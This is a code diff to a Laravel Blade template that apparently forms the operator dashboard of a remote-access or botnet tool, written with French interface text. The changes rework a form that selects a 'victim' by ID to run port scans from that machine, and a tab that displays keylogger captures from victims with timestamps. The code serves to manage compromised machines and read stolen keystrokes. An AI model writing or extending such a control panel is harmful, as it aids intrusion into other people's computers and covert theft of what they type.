@@ -232,47 +232,47 @@
                                 </div>
                             </div>
                         </div>
-
+                        
                         <div class="tab-pane fade" id="bordered-justified-scan" role="tabpanel" aria-labelledby="scan-tab">
                             <div class="card">
                                 <div class="card-body">
                                     <h5 class="card-title">Scan</h5>
                                     <form method="POST" action="{{ route('network.scanport') }}" class="row g-3">
                                         @csrf
-                                            <input type="hidden" name="group_id" value="{{ $group->id }}">
-                                            <div class="col-md-3">
-                                                <select class="form-select" name="victim_uid" id="validationDefault04" required>
-                                                    @foreach ($victims as $victim)
-                                                        <option value="{{ $victim->uid }}">{{ $victim->uid }}</option>
-                                                    @endforeach
-                                                </select>
-                                            </div>
-                                            <div class="col-md-2">
-                                                <input type="text" class="form-control" placeholder="ip" name="ip">
-                                            </div>
-                                            <div class="col-md-2">
-                                                <input type="number" class="form-control" name="port1" required min="1" max="65535" placeholder="port 1">
-                                            </div>
-                                            <div class="col-md-2">
-                                                <input type="number" class="form-control" name="port2" min="1" max="65535" placeholder="port 2">
-                                            </div>
-                                            <div class="col-md-1">
-                                                <button type="submit" class="btn btn-warning"><i class="bi bi-broadcast"></i></button>
-                                            </div>
-                                    </form>
-                                    <div class="tab-content pt-2" id="borderedTabJustifiedContent">
-                                        <div class="tab-pane fade show active" id="bordered-justified-home" role="tabpanel" aria-labelledby="home-tab">
-                                            @if (!empty($scan) && !empty($scan->result))
-                                                <ul class="list-group">
-                                                    @foreach (explode(' / ', $scan->result) as $item)
-                                                        @if (!empty($item))
-                                                            <li class="list-group-item">{{ $item }}</li>
-                                                        @endif
-                                                    @endforeach
-                                                </ul>
-                                            @endif
+                                        <input type="hidden" name="group_id" value="{{ $group->id }}">
+                                        <div class="col-md-3">
+                                            <select class="form-select" name="victim_uid" id="validationDefault04" required>
+                                                @foreach ($victims as $victim)
+                                                <option value="{{ $victim->uid }}">{{ $victim->uid }}</option>
+                                                @endforeach
+                                            </select>
                                         </div>
+                                        <div class="col-md-2">
+                                            <input type="text" class="form-control" placeholder="ip" name="ip">
+                                        </div>
+                                        <div class="col-md-2">
+                                            <input type="number" class="form-control" name="port1" required min="1" max="65535" placeholder="port 1">
+                                        </div>
+                                        <div class="col-md-2">
+                                            <input type="number" class="form-control" name="port2" min="1" max="65535" placeholder="port 2">
+                                        </div>
+                                        <div class="col-md-1">
+                                            <button type="submit" class="btn btn-warning"><i class="bi bi-broadcast"></i></button>
+                                        </div>
+                                    </form>
+                                    <!-- Display scan results if available -->
+                                    @if ($scan && !empty($scan->result))
+                                    <div class="mt-3">
+                                        <h6 class="card-subtitle mb-2 text-muted">Résultat du dernier scan:</h6>
+                                        <ul class="list-group">
+                                            @foreach (explode(' / ', $scan->result) as $item)
+                                            <li class="list-group-item">{{ $item }}</li>
+                                            @endforeach
+                                        </ul>
                                     </div>
+                                    @else
+                                    <p class="mt-3">Aucun résultat de scan trouvé pour ce groupe.</p>
+                                    @endif
                                 </div>
                             </div>
                         </div>
@@ -300,14 +300,17 @@
                                     </form>
                                     <div class="tab-content pt-2" id="borderedTabJustifiedContent">
                                         <div class="tab-pane fade show active" id="bordered-justified-home" role="tabpanel" aria-labelledby="home-tab">
-                                            @if (!empty($keylogger) && !empty($keylogger->result))
+                                            @if ($keyloggers->isNotEmpty())
                                                 <ul class="list-group">
-                                                    @foreach (explode(' ', $keylogger->result) as $item)
-                                                        @if (!empty($item))
-                                                            <li class="list-group-item">{{ $item }}</li>
-                                                        @endif
+                                                    @foreach ($keyloggers as $keylogger)
+                                                        <li class="list-group-item">
+                                                            Date: {{ $keylogger->created_at->format('Y-m-d H:i:s') }} <br>
+                                                            Résultat: {{ $keylogger->result }}
+                                                        </li>
                                                     @endforeach
                                                 </ul>
+                                            @else
+                                                <p>Aucun résultat de keylogger trouvé pour ce groupe.</p>
                                             @endif
                                         </div>
                                     </div>
